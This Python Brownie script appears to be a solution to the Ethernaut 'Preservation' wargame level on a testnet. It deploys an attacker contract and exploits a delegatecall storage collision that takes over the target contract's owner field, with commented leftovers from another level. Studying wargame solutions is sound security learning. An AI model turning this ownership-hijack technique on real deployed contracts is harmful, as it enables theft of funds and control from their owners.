from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3

import time
import json
import os

# for local deployment: 
# - deploy the 2 libraries, get the 2 addresses
# - deploy the preservation contract with the 2 addresses as input of constructor
# - attack contract: 1st will send an address as unint into timeZone1Library address >> it will allow to use the delegate call of lib1 to call the attack contract
#                   2nd: the attack contract will have 3 address fields as the target contract, and will fill the address field owner with attacker contract


# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# DEV deployment
# deployer=accounts[0]
# attacker=accounts[1]
# lib1=LibraryContract.deploy({'from': deployer, 'priority_fee': priority_fee})
# lib2=LibraryContract.deploy({'from': deployer, 'priority_fee': priority_fee})

# target_ct=Preservation.deploy(lib1.address, lib2.address, {'from': deployer, 'priority_fee': priority_fee})

acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0xA3aF3777B856cf233BC77A833B27Ee60F1691F0a'
target_ct=interface.Preservation(target_address)

# deploy attacker contract
attacker_contract=preservationAttack.deploy({'from': attacker, 'priority_fee': priority_fee})

def main():

    print('--- values BEFORE attack ---')
    # print('deployer:', deployer)
    print('attacker:', attacker)
    print('attacker_contract:', attacker_contract.address)
    print('target_ct.timeZone1Library(): ', target_ct.timeZone1Library())
    print('target_ct.timeZone2Library(): ', target_ct.timeZone2Library())
    print('target_ct.owner(): ', target_ct.owner())


    # change timeZone1Library value to put attacker address instead
    tx=target_ct.setFirstTime(attacker_contract.address, {'from': attacker, 'priority_fee': priority_fee})

    # delegate call the attacker contract
    tx_attack=target_ct.setFirstTime(123, {'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})

    print('--- values AFTER attack ---')
    # print('deployer:', deployer)
    print('attacker:', attacker)
    print('attacker_contract:', attacker_contract.address)
    print('target_ct.timeZone1Library(): ', target_ct.timeZone1Library())
    print('target_ct.timeZone2Library(): ', target_ct.timeZone2Library())
    print('target_ct.owner(): ', target_ct.owner())

    # the attacker contract will use the tranferFrom() funciotn, not using the custom modifyer in which th timelock is implemented
    # tx=attacker_contract.attack(balance, {'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})

    # print('player balance after attack: ', target_ct.balanceOf(attacker))

    # print('attacker_contract:', attacker_contract)
    # send some ETH to the attacker contract
    # attacker.transfer(attacker_contract.address, amount=1, priority_fee=priority_fee)
    # print('attacker_contract balance: ', attacker_contract.balance())
    # tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})
    # balance=target_ct.balanceOf(attacker)
    # print('player balance: ', balance)
    # print('attacker_contract balance: ', target_ct.balanceOf(attacker_contract))
    # print('target_ct balance: ', target_ct.balance())
   
